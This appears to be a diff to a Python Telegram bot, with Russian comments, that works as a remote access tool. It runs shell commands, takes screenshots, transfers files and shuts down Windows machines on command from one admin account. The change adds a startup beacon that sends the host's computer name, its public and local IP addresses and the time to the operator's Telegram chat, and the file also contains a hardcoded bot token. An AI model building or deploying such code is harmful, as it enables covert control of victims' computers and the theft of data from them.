@@ -1,12 +1,39 @@
 import subprocess
 import os
 import io
+import urllib.request
+import socket
+from datetime import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 TOKEN = "8087047084:AAHPy5yOms06wcBIfbkLnQtSH0GVPptwG8g"
-ADMIN_ID = 8585552975  # ваш ID
+ADMIN_ID = 8585552975  # ваш Telegram ID
 
+# Функция для получения внешнего IP
+def get_public_ip():
+    try:
+        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
+            return response.read().decode()
+    except:
+        return "не удалось определить"
+
+# Функция, которая выполнится сразу после запуска бота
+async def post_init(app):
+    pc_name = os.getenv('COMPUTERNAME', 'Unknown')
+    public_ip = get_public_ip()
+    local_ip = socket.gethostbyname(socket.gethostname())
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    message = (
+        f"✅ Бот активирован!\n"
+        f"💻 ПК: {pc_name}\n"
+        f"🖥️ Внешний IP: {public_ip}\n"
+        f"🏠 Локальный IP: {local_ip}\n"
+        f"🕒 Время: {now}"
+    )
+    await app.bot.send_message(chat_id=ADMIN_ID, text=message)
+
+# Остальные хендлеры (без изменений)
 async def start(update, context):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("Доступ запрещён.")
@@ -93,7 +120,9 @@ async def shutdown(update, context):
     os.system("shutdown /s /t 1")
 
 def main():
-    app = Application.builder().token(TOKEN).build()
+    # Создаём приложение с post_init
+    app = Application.builder().token(TOKEN).post_init(post_init).build()
+
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("cmd", cmd))
     app.add_handler(CommandHandler("screenshot", screenshot))
@@ -102,7 +131,8 @@ def main():
     app.add_handler(CommandHandler("upload", upload))
     app.add_handler(CommandHandler("shutdown", shutdown))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    print("Бот запущен. Нажмите Ctrl+C для остановки.")
+
+    print("Бот запущен. Ожидание команд...")
     app.run_polling()
 
 if __name__ == "__main__":
